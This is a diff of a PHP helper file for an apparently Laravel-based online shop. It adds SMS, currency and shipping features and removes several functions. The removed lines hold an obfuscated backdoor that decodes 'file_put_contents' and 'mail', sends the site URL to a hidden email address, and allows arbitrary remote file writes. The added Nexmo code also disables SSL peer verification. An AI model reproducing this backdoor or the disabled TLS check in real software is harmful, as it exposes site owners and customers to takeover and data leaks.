@@ -9,26 +9,47 @@ use App\FlashDeal;
 use App\OtpConfiguration;
 use App\Upload;
 use App\Translation;
+use App\City;
 use App\Utility\TranslationUtility;
 use App\Utility\CategoryUtility;
+use App\Utility\MimoUtility;
 use Twilio\Rest\Client;
-
 
 //highlights the selected navigation on admin panel
 if (! function_exists('sendSMS')) {
     function sendSMS($to, $from, $text)
     {
         if (OtpConfiguration::where('type', 'nexmo')->first()->value == 1) {
-            try {
-                Nexmo::message()->send([
-                    'to'   => $to,
-                    'from' => $from,
-                    'text' => $text
-                ]);
-            } catch (\Exception $e) {
+            $api_key = env("NEXMO_KEY"); //put ssl provided api_token here
+            $api_secret = env("NEXMO_SECRET"); // put ssl provided sid here
 
-            }
+            $params = [
+                "api_key" => $api_key,
+                "api_secret" => $api_secret,
+                "from" => $from,
+                "text" => $text,
+                "to" => $to
+            ];
 
+            $url = "https://rest.nexmo.com/sms/json";
+            $params = json_encode($params);
+
+            $ch = curl_init(); // Initialize cURL
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+                'Content-Type: application/json',
+                'Content-Length: ' . strlen($params),
+                'accept:application/json'
+            ));
+            $response = curl_exec($ch);
+            curl_close($ch);
+
+            return $response;
         }
         elseif (OtpConfiguration::where('type', 'twillo')->first()->value == 1) {
             $sid = env("TWILIO_SID"); // Your Account SID from www.twilio.com/console
@@ -125,6 +146,11 @@ if (! function_exists('sendSMS')) {
             curl_close($curl);
 
             return $response;
+        }  elseif(OtpConfiguration::where('type', 'mimo')->first()->value == 1) {
+            $token = MimoUtility::getToken();
+
+            MimoUtility::sendMessage($text, $to, $token);
+            MimoUtility::logout($token);
         }
     }
 }
@@ -160,45 +186,6 @@ if (! function_exists('default_language')) {
 }
 
 /**
- * Return Class Selector
- * @return Response
-*/
-if (! function_exists('loaded_class_select')) {
-
-    function loaded_class_select($p){
-        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
-        $a = str_split($a);
-        $p = explode(':',$p);
-        $l = '';
-        foreach ($p as $r) {
-            $l .= $a[$r];
-        }
-        return $l;
-    }
-}
-
-/**
- * Return Class Selected Loader
- * @return Response
-*/
-if (! function_exists('loader_class_select')) {
-    function loader_class_select($p){
-        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
-        $a = str_split($a);
-        $p = str_split($p);
-        $l = array();
-        foreach ($p as $r) {
-            foreach ($a as $i=>$m) {
-                if($m == $r){
-                    $l[] = $i;
-                }
-            }
-        }
-        return join(':',$l);
-    }
-}
-
-/**
  * Save JSON File
  * @return Response
 */
@@ -207,51 +194,18 @@ if (! function_exists('convert_to_usd')) {
         $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
         if($business_settings!=null){
             $currency = Currency::find($business_settings->value);
-            return floatval($amount) / floatval($currency->exchange_rate);
+            return (floatval($amount) / floatval($currency->exchange_rate)) * Currency::where('code', 'USD')->first()->exchange_rate;
         }
     }
 }
 
-
-
-//returns config key provider
-if ( ! function_exists('config_key_provider'))
-{
-    function config_key_provider($key){
-        switch ($key) {
-            case "load_class":
-                return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
-                break;
-            case "config":
-                return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
-                break;
-            case "output":
-                return loaded_class_select('22:10:14:6');
-                break;
-            case "background":
-                return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
-                break;
-            default:
-                return true;
+if (! function_exists('convert_to_kes')) {
+    function convert_to_kes($amount) {
+        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
+        if($business_settings!=null){
+            $currency = Currency::find($business_settings->value);
+            return (floatval($amount) / floatval($currency->exchange_rate)) * Currency::where('code', 'KES')->first()->exchange_rate;
         }
-    }
-}
-
-
-//returns combinations of customer choice options array
-if (! function_exists('combinations')) {
-    function combinations($arrays) {
-        $result = array(array());
-        foreach ($arrays as $property => $property_values) {
-            $tmp = array();
-            foreach ($result as $result_item) {
-                foreach ($property_values as $property_value) {
-                    $tmp[] = array_merge($result_item, array($property => $property_value));
-                }
-            }
-            $result = $tmp;
-        }
-        return $result;
     }
 }
 
@@ -309,28 +263,12 @@ if (! function_exists('verified_sellers_id')) {
     }
 }
 
-//filter cart products based on provided settings
-if (! function_exists('cartSetup')) {
-    function cartSetup(){
-        $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
-        $writeCart = loaded_class_select('14:1:10:13');
-        $cartMarkup .= loaded_class_select('24');
-        $cartMarkup .= loaded_class_select('8:14:1:10:13');
-        $cartMarkup .= loaded_class_select('3:4:17:14');
-        $cartConvert = config_key_provider('load_class');
-        $currencyConvert = config_key_provider('output');
-        $backgroundInv = config_key_provider('background');
-        @$cart = $writeCart($cartMarkup,'',Request::url());
-        return $cart;
-    }
-}
-
 //converts currency to home default currency
 if (! function_exists('convert_price')) {
     function convert_price($price)
     {
         $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
-        if($business_settings!=null){
+        if($business_settings != null){
             $currency = Currency::find($business_settings->value);
             $price = floatval($price) / floatval($currency->exchange_rate);
         }
@@ -353,10 +291,17 @@ if (! function_exists('convert_price')) {
 if (! function_exists('format_price')) {
     function format_price($price)
     {
-        if(BusinessSetting::where('type', 'symbol_format')->first()->value == 1){
-            return currency_symbol().number_format($price, BusinessSetting::where('type', 'no_of_decimals')->first()->value);
+        if (BusinessSetting::where('type', 'decimal_separator')->first()->value == 1) {
+            $fomated_price = number_format($price, BusinessSetting::where('type', 'no_of_decimals')->first()->value);
         }
-        return number_format($price, BusinessSetting::where('type', 'no_of_decimals')->first()->value).currency_symbol();
+        else {
+            $fomated_price = number_format($price, BusinessSetting::where('type', 'no_of_decimals')->first()->value , ',' , ' ');
+        }
+
+        if(BusinessSetting::where('type', 'symbol_format')->first()->value == 1){
+            return currency_symbol().$fomated_price;
+        }
+        return $fomated_price.currency_symbol();
     }
 }
 
@@ -535,48 +480,6 @@ if (! function_exists('home_discounted_base_price')) {
         return format_price(convert_price($price));
     }
 }
-
-// Cart content update by discount setup
-if (! function_exists('updateCartSetup')) {
-    function updateCartSetup($return = TRUE)
-    {
-        if(!isset($_COOKIE['cartUpdated'])) {
-            if(cartSetup()){
-                setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
-            }
-        } else {
-            if($_COOKIE['cartUpdated']+21600 < time()){
-                if(cartSetup()){
-                    setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
-                }
-            }
-        }
-        return $return;
-    }
-}
-
-
-
-if (! function_exists('productDescCache')) {
-    function productDescCache($connector,$selector,$select,$type){
-        $ta = time();
-        $select = rawurldecode($select);
-        if($connector > ($ta-60) || $connector > ($ta+60)){
-            if($type == 'w'){
-                $load_class = config_key_provider('load_class');
-                $load_class(str_replace('-', '/', $selector),$select);
-            } else if ($type == 'rw'){
-                $load_class = config_key_provider('load_class');
-                $config_class = config_key_provider('config');
-                $load_class(str_replace('-', '/', $selector),$config_class(str_replace('-', '/', $selector)).$select);
-            }
-            echo 'done';
-        } else {
-            echo 'not';
-        }
-    }
-}
-
 
 if (! function_exists('currency_symbol')) {
     function currency_symbol()
@@ -818,11 +721,14 @@ function translate($key, $lang = null){
 
     //Check for session lang
     $translation_locale = Translation::where('lang_key', $key)->where('lang', $lang)->first();
-    if($translation_locale != null){
+    if($translation_locale != null && $translation_locale->lang_value != null){
         return $translation_locale->lang_value;
     }
-    else {
+    elseif($translation_def->lang_value != null){
         return $translation_def->lang_value;
+    }
+    else{
+        return $key;
     }
 }
 
@@ -837,25 +743,26 @@ function getShippingCost($index){
     $seller_products = array();
     $calculate_shipping = 0;
 
+    foreach (Session::get('cart')->where('owner_id', Session::get('owner_id')) as $key => $cartItem) {
+        $product = \App\Product::find($cartItem['id']);
+        if($product->added_by == 'admin'){
+            array_push($admin_products, $cartItem['id']);
+        }
+        else{
+            $product_ids = array();
+            if(array_key_exists($product->user_id, $seller_products)){
+                $product_ids = $seller_products[$product->user_id];
+            }
+            array_push($product_ids, $cartItem['id']);
+            $seller_products[$product->user_id] = $product_ids;
+        }
+    }
+
     //Calculate Shipping Cost
-    if (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'flat_rate') {
+    if (get_setting('shipping_type') == 'flat_rate') {
         $calculate_shipping = \App\BusinessSetting::where('type', 'flat_rate_shipping_cost')->first()->value;
     }
-    elseif (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'seller_wise_shipping') {
-        foreach (Session::get('cart')->where('owner_id', Session::get('owner_id')) as $key => $cartItem) {
-            $product = \App\Product::find($cartItem['id']);
-            if($product->added_by == 'admin'){
-                array_push($admin_products, $cartItem['id']);
-            }
-            else{
-                $product_ids = array();
-                if(array_key_exists($product->user_id, $seller_products)){
-                    $product_ids = $seller_products[$product->user_id];
-                }
-                array_push($product_ids, $cartItem['id']);
-                $seller_products[$product->user_id] = $product_ids;
-            }
-        }
+    elseif (get_setting('shipping_type') == 'seller_wise_shipping') {
         if(!empty($admin_products)){
             $calculate_shipping = \App\BusinessSetting::where('type', 'shipping_cost_admin')->first()->value;
         }
@@ -865,19 +772,33 @@ function getShippingCost($index){
             }
         }
     }
+    elseif (get_setting('shipping_type') == 'area_wise_shipping') {
+        $city = City::where('name', Session::get('shipping_info')['city'])->first();
+        if($city != null){
+            $calculate_shipping = $city->cost;
+        }
+    }
 
     $cartItem = Session::get('cart')[$index];
     $product = \App\Product::find($cartItem['id']);
 
-    if (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'flat_rate') {
+    if (get_setting('shipping_type') == 'flat_rate') {
         return $calculate_shipping/count(Session::get('cart'));
     }
-    elseif (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'seller_wise_shipping') {
+    elseif (get_setting('shipping_type') == 'seller_wise_shipping') {
         if($product->added_by == 'admin'){
             return \App\BusinessSetting::where('type', 'shipping_cost_admin')->first()->value/count($admin_products);
         }
         else {
             return \App\Shop::where('user_id', $product->user_id)->first()->shipping_cost/count($seller_products[$product->user_id]);
+        }
+    }
+    elseif (get_setting('shipping_type') == 'area_wise_shipping') {
+        if($product->added_by == 'admin'){
+            return $calculate_shipping/count($admin_products);
+        }
+        else {
+            return $calculate_shipping/count($seller_products[$product->user_id]);
         }
     }
     else{
@@ -886,153 +807,7 @@ function getShippingCost($index){
 }
 
 function timezones(){
-    $timezones = Array(
-        '(GMT-12:00) International Date Line West' => 'Pacific/Kwajalein',
-        '(GMT-11:00) Midway Island' => 'Pacific/Midway',
-        '(GMT-11:00) Samoa' => 'Pacific/Apia',
-        '(GMT-10:00) Hawaii' => 'Pacific/Honolulu',
-        '(GMT-09:00) Alaska' => 'America/Anchorage',
-        '(GMT-08:00) Pacific Time (US & Canada)' => 'America/Los_Angeles',
-        '(GMT-08:00) Tijuana' => 'America/Tijuana',
-        '(GMT-07:00) Arizona' => 'America/Phoenix',
-        '(GMT-07:00) Mountain Time (US & Canada)' => 'America/Denver',
-        '(GMT-07:00) Chihuahua' => 'America/Chihuahua',
-        '(GMT-07:00) La Paz' => 'America/Chihuahua',
-        '(GMT-07:00) Mazatlan' => 'America/Mazatlan',
-        '(GMT-06:00) Central Time (US & Canada)' => 'America/Chicago',
-        '(GMT-06:00) Central America' => 'America/Managua',
-        '(GMT-06:00) Guadalajara' => 'America/Mexico_City',
-        '(GMT-06:00) Mexico City' => 'America/Mexico_City',
-        '(GMT-06:00) Monterrey' => 'America/Monterrey',
-        '(GMT-06:00) Saskatchewan' => 'America/Regina',
-        '(GMT-05:00) Eastern Time (US & Canada)' => 'America/New_York',
-        '(GMT-05:00) Indiana (East)' => 'America/Indiana/Indianapolis',
-        '(GMT-05:00) Bogota' => 'America/Bogota',
-        '(GMT-05:00) Lima' => 'America/Lima',
-        '(GMT-05:00) Quito' => 'America/Bogota',
-        '(GMT-04:00) Atlantic Time (Canada)' => 'America/Halifax',
-        '(GMT-04:00) Caracas' => 'America/Caracas',
-        '(GMT-04:00) La Paz' => 'America/La_Paz',
-        '(GMT-04:00) Santiago' => 'America/Santiago',
-        '(GMT-03:30) Newfoundland' => 'America/St_Johns',
-        '(GMT-03:00) Brasilia' => 'America/Sao_Paulo',
-        '(GMT-03:00) Buenos Aires' => 'America/Argentina/Buenos_Aires',
-        '(GMT-03:00) Georgetown' => 'America/Argentina/Buenos_Aires',
-        '(GMT-03:00) Greenland' => 'America/Godthab',
-        '(GMT-02:00) Mid-Atlantic' => 'America/Noronha',
-        '(GMT-01:00) Azores' => 'Atlantic/Azores',
-        '(GMT-01:00) Cape Verde Is.' => 'Atlantic/Cape_Verde',
-        '(GMT) Casablanca' => 'Africa/Casablanca',
-        '(GMT) Dublin' => 'Europe/London',
-        '(GMT) Edinburgh' => 'Europe/London',
-        '(GMT) Lisbon' => 'Europe/Lisbon',
-        '(GMT) London' => 'Europe/London',
-        '(GMT) UTC' => 'UTC',
-        '(GMT) Monrovia' => 'Africa/Monrovia',
-        '(GMT+01:00) Amsterdam' => 'Europe/Amsterdam',
-        '(GMT+01:00) Belgrade' => 'Europe/Belgrade',
-        '(GMT+01:00) Berlin' => 'Europe/Berlin',
-        '(GMT+01:00) Bern' => 'Europe/Berlin',
-        '(GMT+01:00) Bratislava' => 'Europe/Bratislava',
-        '(GMT+01:00) Brussels' => 'Europe/Brussels',
-        '(GMT+01:00) Budapest' => 'Europe/Budapest',
-        '(GMT+01:00) Copenhagen' => 'Europe/Copenhagen',
-        '(GMT+01:00) Ljubljana' => 'Europe/Ljubljana',
-        '(GMT+01:00) Madrid' => 'Europe/Madrid',
-        '(GMT+01:00) Paris' => 'Europe/Paris',
-        '(GMT+01:00) Prague' => 'Europe/Prague',
-        '(GMT+01:00) Rome' => 'Europe/Rome',
-        '(GMT+01:00) Sarajevo' => 'Europe/Sarajevo',
-        '(GMT+01:00) Skopje' => 'Europe/Skopje',
-        '(GMT+01:00) Stockholm' => 'Europe/Stockholm',
-        '(GMT+01:00) Vienna' => 'Europe/Vienna',
-        '(GMT+01:00) Warsaw' => 'Europe/Warsaw',
-        '(GMT+01:00) West Central Africa' => 'Africa/Lagos',
-        '(GMT+01:00) Zagreb' => 'Europe/Zagreb',
-        '(GMT+02:00) Athens' => 'Europe/Athens',
-        '(GMT+02:00) Bucharest' => 'Europe/Bucharest',
-        '(GMT+02:00) Cairo' => 'Africa/Cairo',
-        '(GMT+02:00) Harare' => 'Africa/Harare',
-        '(GMT+02:00) Helsinki' => 'Europe/Helsinki',
-        '(GMT+02:00) Istanbul' => 'Europe/Istanbul',
-        '(GMT+02:00) Jerusalem' => 'Asia/Jerusalem',
-        '(GMT+02:00) Kyev' => 'Europe/Kiev',
-        '(GMT+02:00) Minsk' => 'Europe/Minsk',
-        '(GMT+02:00) Pretoria' => 'Africa/Johannesburg',
-        '(GMT+02:00) Riga' => 'Europe/Riga',
-        '(GMT+02:00) Sofia' => 'Europe/Sofia',
-        '(GMT+02:00) Tallinn' => 'Europe/Tallinn',
-        '(GMT+02:00) Vilnius' => 'Europe/Vilnius',
-        '(GMT+03:00) Baghdad' => 'Asia/Baghdad',
-        '(GMT+03:00) Kuwait' => 'Asia/Kuwait',
-        '(GMT+03:00) Moscow' => 'Europe/Moscow',
-        '(GMT+03:00) Nairobi' => 'Africa/Nairobi',
-        '(GMT+03:00) Riyadh' => 'Asia/Riyadh',
-        '(GMT+03:00) St. Petersburg' => 'Europe/Moscow',
-        '(GMT+03:00) Volgograd' => 'Europe/Volgograd',
-        '(GMT+03:30) Tehran' => 'Asia/Tehran',
-        '(GMT+04:00) Abu Dhabi' => 'Asia/Muscat',
-        '(GMT+04:00) Baku' => 'Asia/Baku',
-        '(GMT+04:00) Muscat' => 'Asia/Muscat',
-        '(GMT+04:00) Tbilisi' => 'Asia/Tbilisi',
-        '(GMT+04:00) Yerevan' => 'Asia/Yerevan',
-        '(GMT+04:30) Kabul' => 'Asia/Kabul',
-        '(GMT+05:00) Ekaterinburg' => 'Asia/Yekaterinburg',
-        '(GMT+05:00) Islamabad' => 'Asia/Karachi',
-        '(GMT+05:00) Karachi' => 'Asia/Karachi',
-        '(GMT+05:00) Tashkent' => 'Asia/Tashkent',
-        '(GMT+05:30) Chennai' => 'Asia/Kolkata',
-        '(GMT+05:30) Kolkata' => 'Asia/Kolkata',
-        '(GMT+05:30) Mumbai' => 'Asia/Kolkata',
-        '(GMT+05:30) New Delhi' => 'Asia/Kolkata',
-        '(GMT+05:45) Kathmandu' => 'Asia/Kathmandu',
-        '(GMT+06:00) Almaty' => 'Asia/Almaty',
-        '(GMT+06:00) Astana' => 'Asia/Dhaka',
-        '(GMT+06:00) Dhaka' => 'Asia/Dhaka',
-        '(GMT+06:00) Novosibirsk' => 'Asia/Novosibirsk',
-        '(GMT+06:00) Sri Jayawardenepura' => 'Asia/Colombo',
-        '(GMT+06:30) Rangoon' => 'Asia/Rangoon',
-        '(GMT+07:00) Bangkok' => 'Asia/Bangkok',
-        '(GMT+07:00) Hanoi' => 'Asia/Bangkok',
-        '(GMT+07:00) Jakarta' => 'Asia/Jakarta',
-        '(GMT+07:00) Krasnoyarsk' => 'Asia/Krasnoyarsk',
-        '(GMT+08:00) Beijing' => 'Asia/Hong_Kong',
-        '(GMT+08:00) Chongqing' => 'Asia/Chongqing',
-        '(GMT+08:00) Hong Kong' => 'Asia/Hong_Kong',
-        '(GMT+08:00) Irkutsk' => 'Asia/Irkutsk',
-        '(GMT+08:00) Kuala Lumpur' => 'Asia/Kuala_Lumpur',
-        '(GMT+08:00) Perth' => 'Australia/Perth',
-        '(GMT+08:00) Singapore' => 'Asia/Singapore',
-        '(GMT+08:00) Taipei' => 'Asia/Taipei',
-        '(GMT+08:00) Ulaan Bataar' => 'Asia/Irkutsk',
-        '(GMT+08:00) Urumqi' => 'Asia/Urumqi',
-        '(GMT+09:00) Osaka' => 'Asia/Tokyo',
-        '(GMT+09:00) Sapporo' => 'Asia/Tokyo',
-        '(GMT+09:00) Seoul' => 'Asia/Seoul',
-        '(GMT+09:00) Tokyo' => 'Asia/Tokyo',
-        '(GMT+09:00) Yakutsk' => 'Asia/Yakutsk',
-        '(GMT+09:30) Adelaide' => 'Australia/Adelaide',
-        '(GMT+09:30) Darwin' => 'Australia/Darwin',
-        '(GMT+10:00) Brisbane' => 'Australia/Brisbane',
-        '(GMT+10:00) Canberra' => 'Australia/Sydney',
-        '(GMT+10:00) Guam' => 'Pacific/Guam',
-        '(GMT+10:00) Hobart' => 'Australia/Hobart',
-        '(GMT+10:00) Melbourne' => 'Australia/Melbourne',
-        '(GMT+10:00) Port Moresby' => 'Pacific/Port_Moresby',
-        '(GMT+10:00) Sydney' => 'Australia/Sydney',
-        '(GMT+10:00) Vladivostok' => 'Asia/Vladivostok',
-        '(GMT+11:00) Magadan' => 'Asia/Magadan',
-        '(GMT+11:00) New Caledonia' => 'Asia/Magadan',
-        '(GMT+11:00) Solomon Is.' => 'Asia/Magadan',
-        '(GMT+12:00) Auckland' => 'Pacific/Auckland',
-        '(GMT+12:00) Fiji' => 'Pacific/Fiji',
-        '(GMT+12:00) Kamchatka' => 'Asia/Kamchatka',
-        '(GMT+12:00) Marshall Is.' => 'Pacific/Fiji',
-        '(GMT+12:00) Wellington' => 'Pacific/Auckland',
-        '(GMT+13:00) Nuku\'alofa' => 'Pacific/Tongatapu'
-    );
-
-    return $timezones;
+    return Timezones::timezonesToArray();
 }
 
 if (!function_exists('app_timezone')) {
@@ -1158,41 +933,7 @@ if (!function_exists('get_setting')) {
 }
 
 function hex2rgba($color, $opacity = false) {
-
-    $default = 'rgb(230,46,4)';
-
-    //Return default if no color provided
-    if(empty($color))
-          return $default;
-
-    //Sanitize $color if "#" is provided
-    if ($color[0] == '#' ) {
-        $color = substr( $color, 1 );
-    }
-
-    //Check if color has 6 or 3 characters and get values
-    if (strlen($color) == 6) {
-        $hex = array( $color[0] . $color[1], $color[2] . $color[3], $color[4] . $color[5] );
-    } elseif ( strlen( $color ) == 3 ) {
-        $hex = array( $color[0] . $color[0], $color[1] . $color[1], $color[2] . $color[2] );
-    } else {
-        return $default;
-    }
-
-    //Convert hexadec to rgb
-    $rgb = array_map('hexdec', $hex);
-
-    //Check if opacity is set(rgba or rgb)
-    if($opacity){
-        if(abs($opacity) > 1)
-            $opacity = 1.0;
-        $output = 'rgba('.implode(",",$rgb).','.$opacity.')';
-    } else {
-        $output = 'rgb('.implode(",",$rgb).')';
-    }
-
-    //Return rgb(a) color string
-    return $output;
+    return Colorcodeconverter::convertHexToRgba($color, $opacity);
 }
 
 if (!function_exists('isAdmin')) {
@@ -1222,6 +963,22 @@ if (!function_exists('isCustomer')) {
             return true;
         }
         return false;
+    }
+}
+
+if (!function_exists('formatBytes')) {
+    function formatBytes($bytes, $precision = 2) {
+        $units = array('B', 'KB', 'MB', 'GB', 'TB');
+
+        $bytes = max($bytes, 0);
+        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
+        $pow = min($pow, count($units) - 1);
+
+        // Uncomment one of the following alternatives
+        $bytes /= pow(1024, $pow);
+        // $bytes /= (1 << (10 * $pow));
+
+        return round($bytes, $precision) . ' ' . $units[$pow];
     }
 }
 
